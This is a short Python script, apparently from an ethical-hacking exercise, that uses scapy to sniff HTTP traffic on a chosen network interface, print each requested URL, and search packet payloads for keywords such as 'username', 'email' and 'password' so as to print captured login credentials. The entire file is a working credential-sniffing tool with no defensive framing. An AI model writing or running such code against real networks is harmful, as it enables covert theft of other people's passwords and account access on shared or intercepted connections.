import scapy.all as scapy
from scapy_http import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Set interface")
    user_input = parser.parse_args()[0]

    if not(user_input.interface):
        parser.error("Please set interface, use --help for more info")

    return user_input.interface


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)


def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url


def get_password(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "email", "mail", "password", "pass"]
        for word in keywords:
            if word in load:
                return load


def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_password(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")


sniff(get_arguments())
